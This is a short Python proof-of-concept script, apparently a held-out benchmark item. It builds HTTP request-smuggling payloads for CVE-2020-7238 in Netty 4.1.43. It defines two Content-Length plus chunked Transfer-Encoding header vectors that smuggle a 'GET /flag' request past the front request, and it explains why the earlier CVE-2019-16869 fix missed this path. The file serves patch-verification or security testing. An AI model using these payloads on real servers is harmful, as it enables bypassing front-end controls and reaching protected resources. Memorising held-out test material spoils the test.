#!/usr/bin/env python3
"""[HELD-OUT] CVE-2020-7238 residual exploit -- the incomplete fix in CVE-2019-16869.

The CVE-2019-16869 fix (PR #9585) only closed the whitespace-before-colon path in
`splitHeader`. It did NOT reconcile a front request that carries BOTH a Content-Length
AND a `Transfer-Encoding: chunked` header (clean, no whitespace). On the target V1
(4.1.43) `readHeaders` still lets chunked silently override Content-Length with no
error, so the front request is framed as chunked; an empty chunked body terminates it
and the pipelined `GET /flag` is decoded as the next request -> the same smuggle the
seed used is re-enabled, bypassing the guard.

  V1 netty 4.1.43: readHeaders accepts CL + TE:chunked -> chunked wins -> accepted ->
        smuggled GET /flag -> FLAG (residual reaches).
  V2 netty 4.1.44: readHeaders (CVE-2020-7238 fix, PR #9865) throws
        "Both 'Content-Length: N' and 'Transfer-Encoding: chunked' found" ->
        BAD_MESSAGE / 400 -> BLOCKED (residual closed).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from original_poc import build_smuggle  # noqa: E402

# Each vector frames the front request with a Content-Length AND a chunked
# Transfer-Encoding (the classic CL.TE conflict). All are accepted by 4.1.43 and
# rejected by 4.1.44's CL+TE guard.
VECTORS = [
    (
        "cve-2020-7238-cl-plus-te-chunked",
        b"Content-Length: 5\r\nTransfer-Encoding: chunked\r\n",
    ),
    (
        "cve-2020-7238-te-chunked-then-cl",
        b"Transfer-Encoding: chunked\r\nContent-Length: 5\r\n",
    ),
]


def candidate(vec=None) -> dict:
    vid, front = vec if vec is not None else VECTORS[0]
    return {"id": vid, "raw": build_smuggle(front)}


if __name__ == "__main__":
    for v in VECTORS:
        c = candidate(v)
        print(c["id"], repr(c["raw"]))
